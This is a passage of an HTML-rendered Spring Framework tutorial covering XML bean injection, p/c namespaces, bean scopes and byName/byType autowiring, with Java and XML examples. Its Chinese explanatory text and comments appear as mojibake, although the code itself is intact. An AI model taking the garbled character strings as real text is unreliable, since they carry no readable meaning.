class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;<br><br>    &lt;bean id=<span class="hljs-string">&quot;address&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Address&quot;</span>&gt;<br>        &lt;property name=<span class="hljs-string">&quot;address&quot;</span> value=<span class="hljs-string">&quot;åŒ—äº¬å¸‚æµ·æ·€åŒº&quot;</span>/&gt;<br>    &lt;/bean&gt;<br><br>    &lt;bean id=<span class="hljs-string">&quot;student&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Student&quot;</span>&gt;<br>        &lt;!--ç¬¬ä¸€ç§ï¼Œæ™®é€šå€¼æ³¨å…¥ï¼Œvalue--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;qwer&quot;</span>/&gt;<br><br>        &lt;!--ç¬¬äºŒç§ï¼ŒBeanæ³¨å…¥ï¼Œref--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;address&quot;</span> ref=<span class="hljs-string">&quot;address&quot;</span>/&gt;<br><br>        &lt;!--æ•°ç»„--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;books&quot;</span>&gt;<br>            &lt;array&gt;<br>                &lt;value&gt;è¥¿æ¸¸è®°&lt;/value&gt;<br>                &lt;value&gt;çº¢æ¥¼æ¢¦&lt;/value&gt;<br>                &lt;value&gt;æ°´æµ’ä¼ &lt;/value&gt;<br>            &lt;/array&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--List--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;hobbys&quot;</span>&gt;<br>            &lt;list&gt;<br>                &lt;value&gt;å¬æ­Œ&lt;/value&gt;<br>                &lt;value&gt;çœ‹ç”µå½±&lt;/value&gt;<br>                &lt;value&gt;çˆ¬å±±&lt;/value&gt;<br>            &lt;/list&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--Map--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;card&quot;</span>&gt;<br>            &lt;map&gt;<br>                &lt;entry key=<span class="hljs-string">&quot;ä¸­å›½é‚®æ”¿&quot;</span> value=<span class="hljs-string">&quot;456456456465456&quot;</span>/&gt;<br>                &lt;entry key=<span class="hljs-string">&quot;å»ºè®¾&quot;</span> value=<span class="hljs-string">&quot;1456682255511&quot;</span>/&gt;<br>            &lt;/map&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--set--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;game&quot;</span>&gt;<br>            &lt;set&gt;<br>                &lt;value&gt;LOL&lt;/value&gt;<br>                &lt;value&gt;BOB&lt;/value&gt;<br>                &lt;value&gt;COC&lt;/value&gt;<br>            &lt;/set&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--Null--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;wife&quot;</span>&gt;<br>            &lt;<span class="hljs-literal">null</span>/&gt;<br>        &lt;/property&gt;<br><br>        &lt;!--Properties--&gt;<br>        &lt;property name=<span class="hljs-string">&quot;info&quot;</span>&gt;<br>            &lt;props&gt;<br>                &lt;prop key=<span class="hljs-string">&quot;name&quot;</span>&gt;qwer&lt;/prop&gt;<br>                &lt;prop key=<span class="hljs-string">&quot;age&quot;</span>&gt;<span class="hljs-number">18</span>&lt;/prop&gt;<br>            &lt;/props&gt;<br>        &lt;/property&gt;<br><br>    &lt;/bean&gt;<br>&lt;/beans&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752395.png" alt="img"></p><h3 id="2-6-3-æ‹“å±•æ–¹å¼æ³¨å…¥"><a href="#2-6-3-æ‹“å±•æ–¹å¼æ³¨å…¥" class="headerlink" title="2 .6.3 æ‹“å±•æ–¹å¼æ³¨å…¥"></a>2 .6.3 æ‹“å±•æ–¹å¼æ³¨å…¥</h3><h4 id="på‘½åå’Œcå‘½åæ³¨å…¥"><a href="#på‘½åå’Œcå‘½åæ³¨å…¥" class="headerlink" title="på‘½åå’Œcå‘½åæ³¨å…¥"></a>på‘½åå’Œcå‘½åæ³¨å…¥</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752784.png" alt="img"></p><ul><li>På‘½åç©ºé—´æ³¨å…¥ : éœ€è¦åœ¨å¤´æ–‡ä»¶ä¸­åŠ å…¥çº¦æŸæ–‡ä»¶</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">å¯¼å…¥çº¦æŸ : xmlns:p=&quot;http://www.springframework.org/schema/p&quot;<br><br><span class="hljs-comment">&lt;!--P(å±æ€§: properties)å‘½åç©ºé—´ , å±æ€§ä¾ç„¶è¦è®¾ç½®setæ–¹æ³•--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span> <span class="hljs-attr">p:name</span>=<span class="hljs-string">&quot;qwer&quot;</span> <span class="hljs-attr">p:age</span>=<span class="hljs-string">&quot;12&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>éœ€è¦å¯¼å…¥ junit åŒ…</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311750611.png" alt="img"></p><ul><li>c å‘½åç©ºé—´æ³¨å…¥ : éœ€è¦åœ¨å¤´æ–‡ä»¶ä¸­åŠ å…¥çº¦æŸæ–‡ä»¶ï¼ŒåŒæ—¶åŠ ä¸Šæœ‰å‚æ„é€ å™¨</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">å¯¼å…¥çº¦æŸ : xmlns:c=&quot;http://www.springframework.org/schema/c&quot;<br><span class="hljs-comment">&lt;!--C(æ„é€ : Constructor)å‘½åç©ºé—´ , å±æ€§ä¾ç„¶è¦è®¾ç½®setæ–¹æ³•--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span> <span class="hljs-attr">c:name</span>=<span class="hljs-string">&quot;qaz&quot;</span> <span class="hljs-attr">c:age</span>=<span class="hljs-string">&quot;18&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>æœ‰å‚å’Œæ— å‚æ„é€ å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>    <span class="hljs-built_in">this</span>.name = name;<br>    <span class="hljs-built_in">this</span>.age = age;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311750287.png" alt="img"></p><h2 id="2-7-Bean-ä½œç”¨åŸŸ"><a href="#2-7-Bean-ä½œç”¨åŸŸ" class="headerlink" title="2.7 Bean ä½œç”¨åŸŸ"></a>2.7 Bean ä½œç”¨åŸŸ</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311750413.png" alt="img"></p><p>å‡ ç§ä½œç”¨åŸŸä¸­ï¼Œrequestã€sessionä½œç”¨åŸŸä»…åœ¨åŸºäºwebçš„åº”ç”¨ä¸­ä½¿ç”¨ï¼ˆä¸å¿…å…³å¿ƒä½ æ‰€é‡‡ç”¨çš„æ˜¯ä»€ä¹ˆwebåº”ç”¨æ¡†æ¶ï¼‰ï¼Œåªèƒ½ç”¨åœ¨åŸºäºwebçš„Spring ApplicationContextç¯å¢ƒã€‚</p><h3 id="The-Singleton-Scope-ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰"><a href="#The-Singleton-Scope-ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰" class="headerlink" title="The Singleton Scope ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰"></a>The Singleton Scope ï¼ˆå•ä¾‹æ¨¡å¼ï¼‰</h3><p>åœ¨Spring loCå®¹å™¨ä¸­ä»…å­˜åœ¨ä¸€ä¸ªBeanå®ä¾‹ï¼ŒBeanä»¥å•ä¾‹æ–¹å¼å­˜åœ¨ï¼Œé»˜è®¤å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749740.png" alt="img"></p><p>å½“ä¸€ä¸ªbeançš„ä½œç”¨åŸŸä¸ºSingletonï¼Œé‚£ä¹ˆSpring IoCå®¹å™¨ä¸­åªä¼šå­˜åœ¨ä¸€ä¸ªå…±äº«çš„beanå®ä¾‹ï¼Œå¹¶ä¸”æ‰€æœ‰å¯¹beançš„è¯·æ±‚ï¼Œåªè¦idä¸è¯¥beanå®šä¹‰ç›¸åŒ¹é…ï¼Œåˆ™åªä¼šè¿”å›beançš„åŒä¸€å®ä¾‹ã€‚Singletonæ˜¯å•ä¾‹ç±»å‹ï¼Œå°±æ˜¯åœ¨åˆ›å»ºèµ·å®¹å™¨æ—¶å°±åŒæ—¶è‡ªåŠ¨åˆ›å»ºäº†ä¸€ä¸ªbeançš„å¯¹è±¡ï¼Œä¸ç®¡ä½ æ˜¯å¦ä½¿ç”¨ï¼Œä»–éƒ½å­˜åœ¨äº†ï¼Œæ¯æ¬¡è·å–åˆ°çš„å¯¹è±¡éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚æ³¨æ„ï¼ŒSingletonä½œç”¨åŸŸæ˜¯Springä¸­çš„ç¼ºçœä½œç”¨åŸŸã€‚è¦åœ¨XMLä¸­å°†beanå®šä¹‰æˆsingletonï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user2&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span> <span class="hljs-attr">c:age</span>=<span class="hljs-string">&quot;12&quot;</span> <span class="hljs-attr">c:name</span>=<span class="hljs-string">&quot;qwe&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;singleton&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752692.png" alt="img"></p><h3 id="The-Prototype-Scopeï¼ˆåŸå‹æ¨¡å¼ï¼‰"><a href="#The-Prototype-Scopeï¼ˆåŸå‹æ¨¡å¼ï¼‰" class="headerlink" title="The Prototype Scopeï¼ˆåŸå‹æ¨¡å¼ï¼‰"></a>The Prototype Scopeï¼ˆåŸå‹æ¨¡å¼ï¼‰</h3><p>æ¯æ¬¡ä»å®¹å™¨ä¸­è°ƒç”¨Beanæ—¶ï¼Œéƒ½è¿”å›ä¸€ä¸ªæ–°çš„å®ä¾‹ï¼Œå³æ¯æ¬¡è°ƒç”¨getBean()æ—¶ï¼Œç›¸å½“äºæ‰§è¡ŒnewXxxBean()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749744.png" alt="img"></p><p>å½“ä¸€ä¸ªbeançš„ä½œç”¨åŸŸä¸ºPrototypeï¼Œè¡¨ç¤ºä¸€ä¸ªbeanå®šä¹‰å¯¹åº”å¤šä¸ªå¯¹è±¡å®ä¾‹ã€‚Prototypeä½œç”¨åŸŸçš„beanä¼šå¯¼è‡´åœ¨æ¯æ¬¡å¯¹è¯¥beanè¯·æ±‚ï¼ˆå°†å…¶æ³¨å…¥åˆ°å¦ä¸€ä¸ªbeanä¸­ï¼Œæˆ–è€…ä»¥ç¨‹åºçš„æ–¹å¼è°ƒç”¨å®¹å™¨çš„getBean()æ–¹æ³•ï¼‰æ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„beanå®ä¾‹ã€‚Prototypeæ˜¯åŸå‹ç±»å‹ï¼Œå®ƒåœ¨æˆ‘ä»¬åˆ›å»ºå®¹å™¨çš„æ—¶å€™å¹¶æ²¡æœ‰å®ä¾‹åŒ–ï¼Œè€Œæ˜¯å½“æˆ‘ä»¬è·å–beançš„æ—¶å€™æ‰ä¼šå»åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸”æˆ‘ä»¬æ¯æ¬¡è·å–åˆ°çš„å¯¹è±¡éƒ½ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚æ ¹æ®ç»éªŒï¼Œå¯¹æœ‰çŠ¶æ€çš„beanåº”è¯¥ä½¿ç”¨prototypeä½œç”¨åŸŸï¼Œè€Œå¯¹æ— çŠ¶æ€çš„beanåˆ™åº”è¯¥ä½¿ç”¨singletonä½œç”¨åŸŸã€‚åœ¨XMLä¸­å°†beanå®šä¹‰æˆprototypeï¼Œå¯ä»¥è¿™æ ·é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;accountService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.something.DefaultAccountService&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;prototype&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="requestã€sessionã€application-è¿™äº›åªèƒ½åœ¨-web-å¼€å‘ä¸­ä½¿ç”¨åˆ°"><a href="#requestã€sessionã€application-è¿™äº›åªèƒ½åœ¨-web-å¼€å‘ä¸­ä½¿ç”¨åˆ°" class="headerlink" title="requestã€sessionã€application è¿™äº›åªèƒ½åœ¨ web å¼€å‘ä¸­ä½¿ç”¨åˆ°"></a>requestã€sessionã€application è¿™äº›åªèƒ½åœ¨ web å¼€å‘ä¸­ä½¿ç”¨åˆ°</h3><h2 id="2-8-Bean-çš„è‡ªåŠ¨è£…é…"><a href="#2-8-Bean-çš„è‡ªåŠ¨è£…é…" class="headerlink" title="2.8 Bean çš„è‡ªåŠ¨è£…é…"></a>2.8 Bean çš„è‡ªåŠ¨è£…é…</h2><ul><li>è‡ªåŠ¨è£…é…æ˜¯ä½¿ç”¨springæ»¡è¶³beanä¾èµ–çš„ä¸€ç§æ–¹æ³•</li><li>springä¼šåœ¨åº”ç”¨ä¸Šä¸‹æ–‡ä¸­ä¸ºæŸä¸ªbeanå¯»æ‰¾å…¶ä¾èµ–çš„beanã€‚</li></ul><p><strong>Springä¸­beanæœ‰ä¸‰ç§è£…é…æ–¹å¼ï¼š</strong></p><ol><li>åœ¨xmlä¸­æ˜¾å¼é…ç½®ï¼›</li><li>åœ¨javaä¸­æ˜¾å¼é…ç½®ï¼›</li><li>éšå¼çš„beanå‘ç°æœºåˆ¶å’Œè‡ªåŠ¨è£…é…ã€‚</li></ol><p><strong>Springçš„è‡ªåŠ¨è£…é…çš„ä¸¤ä¸ªæ“ä½œï¼š</strong></p><ol><li>ç»„ä»¶æ‰«æ(component scanning)ï¼šspringä¼šè‡ªåŠ¨å‘ç°åº”ç”¨ä¸Šä¸‹æ–‡ä¸­æ‰€åˆ›å»ºçš„beanï¼›</li><li>è‡ªåŠ¨è£…é…(autowiring)ï¼šspringè‡ªåŠ¨æ»¡è¶³beanä¹‹é—´çš„ä¾èµ–ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„IoC&#x2F;DIï¼›</li></ol><p>ç»„ä»¶æ‰«æå’Œè‡ªåŠ¨è£…é…ç»„åˆå‘æŒ¥å·¨å¤§å¨åŠ›ï¼Œä½¿å¾—æ˜¾ç¤ºçš„é…ç½®é™ä½åˆ°æœ€å°‘ã€‚</p><p><strong>æ¨èä¸ä½¿ç”¨è‡ªåŠ¨è£…é…xmlé…ç½® , è€Œä½¿ç”¨æ³¨è§£</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shout</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;miao~&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shout</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;wang~&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span> &#123;<br>    <span class="hljs-keyword">private</span> Cat cat;<br>    <span class="hljs-keyword">private</span> Dog dog;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> Cat <span class="hljs-title function_">getCat</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> cat;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCat</span><span class="hljs-params">(Cat cat)</span> &#123;<br>        <span class="hljs-built_in">this</span>.cat = cat;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Dog <span class="hljs-title function_">getDog</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDog</span><span class="hljs-params">(Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;People&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;cat=&quot;</span> + cat +<br>        <span class="hljs-string">&quot;, dog=&quot;</span> + dog +<br>        <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span><br>  xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>  xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;<br><br>  &lt;bean id=<span class="hljs-string">&quot;cat&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;dog&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;<br><br>  &lt;bean id=<span class="hljs-string">&quot;people&quot;</span> class=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span>&gt;<br>    &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;was&quot;</span>/&gt;<br>    &lt;property name=<span class="hljs-string">&quot;dog&quot;</span> ref=<span class="hljs-string">&quot;dog&quot;</span>/&gt;<br>    &lt;property name=<span class="hljs-string">&quot;cat&quot;</span> ref=<span class="hljs-string">&quot;cat&quot;</span>/&gt;<br>  &lt;/bean&gt;<br>&lt;/beans&gt;<br><span class="hljs-keyword">import</span> com.kuang.pojo.People;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">People</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;people&quot;</span>, People.class);<br>        people.getCat().shout();<br>        people.getDog().shout();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-8-1-byName-è‡ªåŠ¨è£…é…"><a href="#2-8-1-byName-è‡ªåŠ¨è£…é…" class="headerlink" title="2.8.1 byName è‡ªåŠ¨è£…é…"></a>2.8.1 byName è‡ªåŠ¨è£…é…</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br><br>  <span class="hljs-comment">&lt;!--byName : ä¼šè‡ªåŠ¨åœ¨å®¹å™¨ä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾ï¼Œå’Œè‡ªå·±å¯¹è±¡ set æ–¹æ³•åé¢çš„å€¼å¯¹åº”çš„ beanid--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span> <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byName&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;was&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;dog&quot; ref=&quot;dog&quot;/&gt;--&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;cat&quot; ref=&quot;cat&quot;/&gt;--&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749984.png" alt="img"></p><p><strong>byName å¼ºè°ƒå¯¹è±¡ set æ–¹æ³•å¯¹åº”çš„beanidå”¯ä¸€</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749029.png" alt="img"></p><h3 id="2-8-2-byType-è‡ªåŠ¨è£…é…"><a href="#2-8-2-byType-è‡ªåŠ¨è£…é…" class="headerlink" title="2.8.2 byType è‡ªåŠ¨è£…é…"></a>2.8.2 byType è‡ªåŠ¨è£…é…</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span 